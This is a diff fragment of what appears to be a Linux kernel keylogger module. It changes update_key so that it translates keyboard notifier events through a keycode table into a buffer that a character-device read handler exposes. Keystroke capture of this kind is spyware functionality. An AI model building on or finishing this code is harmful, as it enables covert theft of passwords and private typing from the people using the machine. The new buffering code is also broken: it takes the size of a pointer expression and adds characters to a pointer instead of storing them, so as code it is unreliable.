@@ -6,27 +6,26 @@
 #include <linux/kernel.h>
 #include <linux/fs.h>
 #include "keys.h"
+#define BUFF_SIZE 0x1000
 static char *msg_Ptr;
-void update_key(struct keyboard_notifier_param p)
+char msg_Ptr_size[BUFF_SIZE];
+
+void update_key(struct keyboard_notifier_param *p)
 {
-    if (p.shift){
+    char tav;  
+    if (p->shift){
         /*hundle as shift*/
-        msg_Ptr = keycode[p.value][1];
+        tav = (char)keycode[p->value][1];
     }
     else
     {
-        msg_Ptr= keycode[p.value][0];
+        tav = (char)keycode[p->value][0];
     }
-    
+    if(sizeof(msg_Ptr+tav) < sizeof(char)*BUFF_SIZE){
+        msg_Ptr+=tav;
+    }
 }
-/*
-static int device_open(struct indoe *indoe, struct file *file)
-{
-    static int counter =0;
-    if (Device_open) return -EBUSY;
-    device_open++;
-}
-*/
+
 static ssize_t device_read(struct file *filp, char __user * buffer, size_t length, loff_t *offset)
 {
     int bytes_read=0;
